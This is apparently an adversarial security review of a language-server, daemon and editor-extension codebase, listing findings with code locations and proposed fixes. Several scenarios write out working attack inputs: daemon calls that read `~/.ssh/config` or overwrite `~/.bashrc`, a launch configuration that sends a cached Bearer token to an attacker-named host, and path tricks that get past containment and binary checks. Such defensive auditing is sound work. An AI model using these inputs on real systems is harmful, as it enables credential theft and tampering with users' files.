# r2 review B: al-lsp, al-protocol, al-explorer, al-project, al-compile, al-bc, al-publish, al-dap, extension, plugin, scripts, CI, docs

Adversarial re-review of `git diff dev..campaign/2026-09-21` over the half listed above.
Read-only. Every finding checked against code with file:line and a concrete input.

## Coverage

Part 1, fixes that do not fix the finding (sample of 25+):

- [ ] r1-lsp: generation guard across awaits (92da8dd9)
- [ ] r1-lsp: al.compile holds the guard (92da8dd9)
- [ ] r1-lsp: partial frame desync (620956ba)
- [ ] r1-lsp: daemon path containment (0949a7ae)
- [ ] r1-lsp: block_in_place guard (00667357)
- [ ] r1-lsp: sequential dispatch (f4fe24a4)
- [ ] r1-lsp: Response::null (00667357)
- [ ] r1-lsp: diagnostics retry loop (0255a549)
- [ ] r1-lsp: staging loops (0255a549)
- [ ] r1-lsp: reindex abort half-publish (8981419e)
- [ ] r1-lsp: four insight dispatchers offload (00667357)
- [ ] r1-lsp: al_debug inline config (6d765b94)
- [ ] r1-lsp: configs[0] launch config selection (4af032d6)
- [ ] r1-lsp: did_change reparse (ff9f60a1)
- [ ] r1-ext: cached binary never replaced (4c377a73)
- [ ] r1-ext: archive integrity check (4c377a73)
- [ ] r1-ext: action SHA pinning (af051aa3)
- [ ] r1-ext: cross --locked (af051aa3)
- [ ] r1-ext: release-dryrun gates (96e4945c)
- [ ] r1-ext: debug schema reverse contract (6648ba17)
- [ ] r1-ext: RUSTSEC lock update (f1aa7659)
- [ ] r1-ext: README tasks claim (fb58b642)
- [ ] r1-emit/bc/explorer: sample
- [ ] r1-project: sample (analyzers, config, toolchain)
- [ ] r1-dap / r1b-dap: sample
- [ ] r2-security: all eight
- [ ] r2-merge-regressions: all

Part 2, security fixes under attack:

- [ ] project trust digest coverage (settings value shapes)
- [ ] symlinked project root
- [ ] trust file writable by the repo
- [ ] environment variables a repo can set
- [ ] launch config resolving to a trusted host via DNS/redirect
- [ ] MCP/daemon method reaching a privileged setting without the gate
- [ ] `authorize_cached_credential`
- [ ] containment: deepest-existing-ancestor walk, races, Windows forms
- [ ] the `text` parameter
- [ ] build identity handshake (only if campaign/fix-daemon-lifecycle landed)

Part 3, merge damage:

- [ ] daemon dispatch match: every arm once, right dispatcher
- [ ] projection and scope layer applies to every list method claimed
- [ ] method catalog vs dispatcher vs MCP tool list vs Docs/reference
- [ ] which of these the repo tests miss

Part 4, flagged behaviour changes:

- [ ] relative `file` resolving against project root
- [ ] error -32002
- [ ] `--company` required on `snapshot list`
- [ ] https required for credentials
- [ ] CLI exit codes
- [ ] `al-explorer publish` and daemon `publish`
- [ ] extension `choose_release` and binary verification
- [ ] `binary-checksums.txt` in release.yml
- [ ] plugin resolver script

Part 5, quality of the new code:

- [ ] tests that assert nothing
- [ ] duplicated helpers
- [ ] panics reachable from client input
- [ ] over-long functions, needless public items
- [ ] shell script bugs
- [ ] workflow YAML mistakes
- [ ] plugin skill text vs current tool behaviour

## Findings

### [SECURITY] `rename` never reaches the containment check, so it reads any file the daemon's user can read

- where: `crates/al-lsp/src/server/daemon/lsp_dispatch.rs:210` (`extract_uri`) and `:219`
  (`ensure_document`). Every other single-file dispatcher goes through
  `read_document_from_params` (lsp_dispatch.rs:61, 86, 114, 144, 161, 190, 239, 254, 267, 298, 353)
  or `file_uri_from_params` (fixes.rs:106, :247, organize.rs:45), which call
  `containment::resolve_within_project`. `dispatch_rename` calls neither.
  `ensure_document` (daemon/mod.rs:1431-1467) does `uri.to_file_path()` and
  `read_source_file` with no root check at all.
- severity: high
- scenario: `al_call` with
  `{"method":"rename","params":{"uri":"file:///home/you/.ssh/config","line":0,"character":0,"newName":"x"}}`.
  `extract_uri` accepts it, `ensure_document` reads the file into
  `workspace.documents`, and the rename query runs over it. Two consequences.
  First an existence and content oracle: the file is refused with "is not a regular file"
  when absent and answered otherwise, and the returned `WorkspaceEdit` carries the ranges of
  every occurrence of the identifier under the cursor. Second, and worse, the document stays
  in the store with no `SuppliedDocument` guard to remove it, and
  `read_document_from_params` (daemon/mod.rs:1698-1704) returns an already-open document
  *before* any containment check. So one `rename` seeds the store, and every later
  `documentSymbols`, `semanticTokens`, `foldingRanges`, `hover` and `codeActions` on that same
  `uri` is then answered from a file outside the project.
- the finding it was meant to close: r1-lsp-protocol "[SECURITY] Daemon and MCP file dispatchers
  accept any absolute path" (status: fixed 0949a7ae), whose fix note says "every daemon method
  that takes a path now rejects anything outside the project root".
  `Docs/reference/daemon-methods.md:143` names `rename` among the methods that "stay confined
  to the project". It is not confined.
- why the tests miss it: every containment test in `daemon/mod.rs:2245-2400` calls
  `file_uri_from_params` directly. Nothing asserts that each dispatcher uses it, and there is no
  `rename` test with an out-of-project `uri`.
- fix: route `dispatch_rename` through `file_uri_from_params` like `format` and `sortMembers`.
  Then add a test that walks the dispatch table and asserts every method taking `uri`/`file`
  refuses an outside path with `-32002`, so the next dispatcher cannot be added without it.
- status: open

### [SECURITY] a symlinked `.alpackages` widens the containment boundary to wherever it points

- where: `crates/al-lsp/src/server/daemon/containment.rs:272-288` (`project_boundary` returns
  `project.packages_dir` as a root) and `:102-103`
  (`roots.iter().filter_map(|r| r.canonicalize().ok())`, which resolves the symlink).
  `packages_dir` is set unconditionally at `crates/al-project/src/project.rs:353`
  (`let packages_dir = dir.join(".alpackages");`) with no existence, symlink or containment
  check.
- severity: high
- scenario: a cloned repository ships `.alpackages` as a symlink to `/home/you` (git stores a
  symlink verbatim, so this survives a clone, and nothing in project discovery looks at it).
  Open the project. `project_boundary` returns
  `["<repo>", "<repo>/.alpackages"]`; `resolve_path_within_roots` canonicalises the second to
  `/home/you`, so `/home/you` is now a containment root. Then
  `al_call {"method":"format","params":{"file":"/home/you/.bashrc"}}` passes containment and
  `write_al_file_and_refresh` rewrites that file with formatter output. Every other contained
  write (`fix*`, `sortMembers`, `organizeFiles`, `tests.run`'s `junitOut`, the snapshot
  `outputPath`) reaches the same place.
  The same primitive is available through settings without a symlink on the target side:
  `al.packageCachePath` is gated by trust only when it resolves *outside* the project
  (`crates/al-project/src/trust.rs:461-469`), and `stays_inside_project`
  (`trust.rs:365-389`) normalises the path textually without resolving symlinks, so
  `{"al.packageCachePath": "./cache"}` with `cache -> /home/you` is classed as inside the
  project, applies untrusted, and lands as a containment root.
- fix: canonicalise each boundary root when the project is loaded and refuse (or drop) a root
  that resolves outside the project root unless it came from a trusted setting; and make
  `stays_inside_project` resolve the deepest existing ancestor the way
  `resolve_path_within_roots` does, so a symlink cannot make an outside path look inside.
- status: open

### [SECURITY] the UNC guard is spelled with backslashes only, so the forward-slash form still reaches `canonicalize`

- where: `crates/al-lsp/src/server/daemon/containment.rs:166-169`
  (`text.starts_with(r"\\") || text.starts_with(r"//?/UNC")`), called at `:72`.
- severity: medium
- scenario: Windows accepts `/` as a path separator everywhere, so
  `//attacker.example/share/x` names the same UNC share as `\\attacker.example\share\x`.
  `is_unc` returns false for it (it starts with `//`, not `\\`, and is not `//?/UNC`), so
  `resolve_path_within_roots` reaches `existing.canonicalize()` at `:111` and Windows opens the
  SMB connection the guard exists to prevent. The refusal that follows is after the fact,
  which is exactly the ordering the fix note calls out.
  The test `rejects_a_unc_path_without_touching_the_filesystem`
  (containment.rs:451-464) checks the three backslash spellings and not this one.
  `is_unc` also returns false for any path `to_str()` cannot decode, which on Windows is a
  path with an unpaired surrogate.
- [UNVERIFIED] on Windows: the review host is Linux, so the SMB lookup itself was not observed.
  The text check is incomplete regardless of what Windows does with it.
- fix: normalise separators before the check, or test both `\\` and `//` prefixes and the
  `?/UNC` / `?\UNC` pair. Add the forward-slash spellings to the existing test.
- status: open

### [SLOP] two `serialized_response` helpers with the same name and swapped arguments

- where: `crates/al-lsp/src/server/daemon/mod.rs:1289` is
  `serialized_response(id, value, method)`; `crates/al-lsp/src/server/daemon/build_dispatch/mod.rs:27`
  is `serialized_response(id, label, value)`. `insight_dispatch.rs:6` imports the first
  (`serialized_response(id, &unused, "deadCode")`, `:158`), `build_dispatch/mod.rs:45` uses the
  second (`serialized_response(id, "obsolescence timeline", &entries)`).
  `lsp_dispatch.rs:18` adds a third spelling of the same function, `ok_response(id, value, method)`.
- severity: low
- scenario: both are generic over `T: Serialize` and `&str` is `Serialize`, so moving a call
  between the two modules compiles and serialises the label as the result. A dispatcher moved
  from `build_dispatch` to `insight_dispatch` would start answering `"obsolescence timeline"`
  instead of the report, and no test would fail.
- fix: keep one helper, in `daemon/mod.rs`, with one argument order.
- status: open

### [SLOP] the projection module doc gives an example that does not reduce anything

- where: `crates/al-lsp/src/server/daemon/projection.rs:10-11`: "`by-id table 18` was 194,951
  bytes for a field list; `fields=["fields"]` with `limit=20` is a few kilobytes of the same
  answer."
- severity: low
- scenario: `dispatch_by_id` (lsp_dispatch.rs:711-793) returns an array of *objects*, normally
  one for `table 18`. `limit=20` therefore drops nothing, and `fields=["fields"]` keeps exactly
  the key that holds the 194,951 bytes and drops the small ones. The measurement in the comment
  cannot have come from that call.
- fix: state the parameters that do shrink the answer, or drop the example.
- status: open

### [SECURITY] `tests.snapshot_capture` spends the cached Business Central token without the trust gate

- where: `crates/al-lsp/src/server/daemon/build_dispatch/tests_dispatch.rs:1981-2023`.
  It calls `debug_dispatch::resolve_debug_config` (`:1981`), then
  `al_symbols::oauth::acquire_token` (`:1999`), then passes the token to
  `capture_live_snapshot` (`:2027`), which is `NativeDebugSession::start(config, &access_token)`
  at `crates/al-test/src/backends/snapshot.rs:110` — the same call `debug start` makes.
  `debug start` gates it at `debug_dispatch.rs:355` with `authorize_debug_target`.
  `tests_dispatch.rs` contains no call to `authorize_cached_credential`,
  `authorize_debug_target` or `authorize_launch_target`: grep finds the four call sites in
  `debug_dispatch.rs:252`, `:280`, `workspace.rs:946` and `al-publish/src/lib.rs:352`, and none
  in the tests dispatcher.
- severity: high
- scenario: a cloned repository ships
  `.vscode/launch.json` = `{"configurations":[{"name":"Local","type":"al","request":"launch","environmentType":"OnPrem","server":"http://collector.attacker.example","serverInstance":"BC","authentication":"AAD","tenant":"<victim tenant>"}]}`.
  The project is never trusted. `al_call` with
  `{"method":"tests.snapshot_capture","params":{"codeunit":50100,"method":"TestX","bcVersion":"25.0"}}`
  resolves that configuration, `debug_uses_oauth` is true, the daemon acquires or refreshes the
  user's token from the keyring-backed cache and `NativeDebugSession::start` sends it as a
  `Bearer` header to the attacker's host. `debug start` with the same launch file refuses,
  naming the project and `al-explorer trust`. Both the trust requirement and the `http://`
  cleartext refusal in `authorize_cached_credential` (trust.rs:647-656) are skipped.
  `debug.accept_invalid_certs` from the same launch file is applied too, without the
  `may_accept_invalid_certs` check that `debug start` performs at `debug_dispatch.rs:358`.
- the claim it breaks: `Docs/features/project-trust.md` "Credentials": "Every path that spends a
  cached Business Central token goes through one authorisation function: debug start, publish, a
  test run against live BC, snapshot capture, and symbol download from a BC server." Two of the
  five named paths live in `tests_dispatch.rs` and neither calls it.
- fix: call `debug_dispatch::authorize_debug_target(workspace, &debug, TargetSource::Repository)`
  in `dispatch_tests_snapshot_capture` before `acquire_token`, and refuse
  `accept_invalid_certs` when the authorization does not allow it. Add a test that lists every
  `acquire_token` / `NativeDebugSession::start` call site and asserts an authorisation call
  precedes it.
- status: open

### [SECURITY] the worktree-binary check compares strings, so `..` inside an absolute path walks past it

- where: `src/settings.rs:201-216` (`is_worktree_resident_program`), used at `src/lib.rs:530`
  (`binary.path`) and `:533` (`dotnetPath`). `find_or_download_binary` returns a
  `user_configured_path` at `src/lib.rs:362-364`, before the download and before
  `verify_extracted_binaries`.
- severity: high
- scenario: the check calls a path resident when it is relative, or when
  `path.strip_prefix(root)` succeeds and the remainder starts with a separator. Nothing
  normalises `.` or `..` first. A repository at `/home/you/src/SomeApp` ships
  `.zed/settings.json` =
  `{"lsp":{"al-lsp":{"binary":{"path":"/home/you/src/../src/SomeApp/tools/al-lsp"},"settings":{"dotnetPath":"/home/you/src/../src/SomeApp/tools/dotnet"}}}}`.
  `"/home/you/src/../src/SomeApp/tools/al-lsp".strip_prefix("/home/you/src/SomeApp")` returns
  `None` (the strings diverge at `.` versus `S`), so `is_worktree_resident_program` is false,
  the path is accepted, and `find_or_download_binary` returns the repository's own executable
  with no checksum check. Opening the project in Zed is the whole attack.
  The same shape reaches `dotnetPath`, although `al_project::trust::enforce_dotnet_path`
  (`crates/al-project/src/trust.rs:754-777`) is a second line of defence there because
  `stays_inside_project` does normalise `..`. There is no second line of defence for
  `binary.path`: the binary it names is the server.
  Two more spellings walk past the same check: a path reached through a symlinked ancestor, and
  on a case-insensitive filesystem a path spelled with different case from `worktree_root`.
- the finding it was meant to close: r2-security "[SECURITY] Zed LSP settings choose the
  `dotnet` program and the language server binary" (status: fixed d4445c20).
- why the tests miss it: `src/settings_test.rs:231-258` covers `./tools/al-lsp`,
  `tools/dotnet`, the plain absolute form, `/usr/bin/dotnet`, the `SomeApp-tools` sibling and
  whitespace. No case has `..`, `.`, a symlink or mixed case.
- fix: normalise the path textually before comparing (fold `.`, resolve `..`, collapse repeated
  separators, and compare case-insensitively on Windows and macOS), and reject any path that
  still contains `..` rather than trying to interpret it.
- status: open

### [BUG] `al-bin.sh` loops forever when `CLAUDE_PLUGIN_ROOT` is a relative path

- where: `plugin/scripts/al-bin.sh:57-72` (the upward `target/` search).
- severity: low
- scenario: `search="${CLAUDE_PLUGIN_ROOT-}"` is used as given; only the *fallback* branch makes
  the path absolute (`cd -- "$(dirname -- "$0")/.." && pwd`). With a relative
  `CLAUDE_PLUGIN_ROOT` such as `plugins/al-bc`, the loop reaches `search="."`, and
  `dirname -- "."` is `.`, so `[ -n "$search" ] && [ "$search" != "/" ]` stays true forever.
  `.mcp.json` runs this script, so the MCP server never starts and never reports why.
- fix: make `search` absolute before the loop, the same way the fallback branch does, or stop
  when `dirname` returns the value it was given.
- status: open

### [TEST] a consistency test asserts on the word "signature" appearing in the source

- where: `src/repo_consistency_test.rs:782-785`:
  `assert!(!lib.contains("signature"), "the extension verifies no signature, so its source must not claim one")`.
- severity: low
- scenario: the assertion is over the whole of `src/lib.rs` as text, so it fails on any comment
  that mentions the word, including one added to explain that no signature is checked. It
  constrains prose rather than behaviour, and the behaviour it means to pin (no signature
  verification) is not what it tests.
- fix: drop it, or test the thing itself, for example that `verify_extracted_binaries` is the
  only verification call in the download path.
- status: open

### [BUG] `binary-checksums.txt` is the file the extension trusts and the one the attestation leaves out

- where: `.github/workflows/release.yml:296-303` (`checksums.txt` covers `*.tar.gz`, `*.zip`,
  `extension.wasm`, `extension.toml`), `:343` (`subject-checksums: artifacts/checksums.txt`),
  `:322-324` (`binary-checksums.txt` is built separately), `src/lib.rs:304-349`
  (the extension verifies against `binary-checksums.txt` and nothing else).
- severity: low
- scenario: `gh attestation verify` covers the archives. The extension never hashes an archive,
  because `zed::download_file` extracts and discards it, so it checks the extracted binaries
  against `binary-checksums.txt` — a file that is neither attested nor listed in
  `checksums.txt`. Anyone who can add an asset to the release can replace both the archive and
  that digest list, and the attestation on the archives does not help because nothing in the
  extension reads it.
- fix: include `binary-checksums.txt` in `checksums.txt` (and so in the attestation subjects),
  so a manual verifier can at least check it. Say in the docs that the extension's automatic
  path verifies integrity only.
- status: open

### [DOCS] the trust doc states three rules the code does not enforce everywhere

- where: `Docs/features/project-trust.md` "Credentials" bullets 2-4, against
  `crates/al-lsp/src/server/daemon/build_dispatch/build/bc_server_params.rs:51-56` and
  `crates/al-lsp/src/server/daemon/build_dispatch/build/snapshot_profiling.rs:43`, `:200`.
- severity: medium
- scenario: the doc says "`acceptInvalidCerts` is honoured only where the project's own
  configuration sets it for the same target, and only when the project is trusted." The
  `snapshot` and `profiling` daemon methods read `acceptInvalidCerts` straight out of the
  request parameters and pass it into `danger_accept_invalid_certs`
  (`crates/al-bc/src/http_auth.rs:91-95`) with no configuration and no trust involved:
  `al_call {"method":"snapshot","params":{"cmd":"list","serverUrl":"https://erp.example.com/BC","company":"X","username":"u","password":"p","acceptInvalidCerts":true}}`.
  Those are caller-supplied credentials rather than cached ones, which is the honest
  distinction, and the doc does not draw it.
  The same section says "a test run against live BC" goes through the authorisation function;
  `dispatch_tests_run` picks its `BcServerConfig` at `tests_dispatch.rs:750-793` and does not.
- fix: say that the rule covers cached credentials, and name the methods where a caller spends
  its own credentials and chooses its own TLS setting.
- status: open

### [DOCS] `--scope` help omits `table-impact`

- where: `crates/al-explorer/src/cli/args.rs:74-76`: "Applies to impact, entrypoints and
  event-map", against `crates/al-lsp/src/server/daemon/scope.rs:46-54`, which also lists
  `tableImpact`, and `Docs/reference/daemon-methods.md:91`, which lists four.
- severity: low
- fix: add `table-impact` to the help text.
- status: open

## Verified fixes
